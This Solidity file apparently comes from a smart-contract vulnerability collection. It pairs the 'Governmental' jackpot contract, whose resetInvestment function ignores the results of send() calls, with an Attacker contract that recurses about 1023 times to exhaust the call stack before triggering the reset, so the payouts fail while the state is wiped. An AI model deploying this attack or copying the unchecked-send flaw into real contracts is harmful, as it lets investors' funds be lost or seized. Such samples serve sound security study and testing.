pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot;
  uint public lastInvestmentTimestamp;
  uint ONE_MINUTE;

  function Governmental() {
    owner = msg.sender;
    jackpot = 1 ether;
    ONE_MINUTE = 1 minutes;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    uint _msgValue = msg.value; 
    if (_msgValue<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += _msgValue/2;
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    uint _blockTimestamp = block.timestamp;
    if (_blockTimestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    uint _count = count;
    if (0<=_count && _count<1023) {
      this.attack.gas(msg.gas-2000)(target, _count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}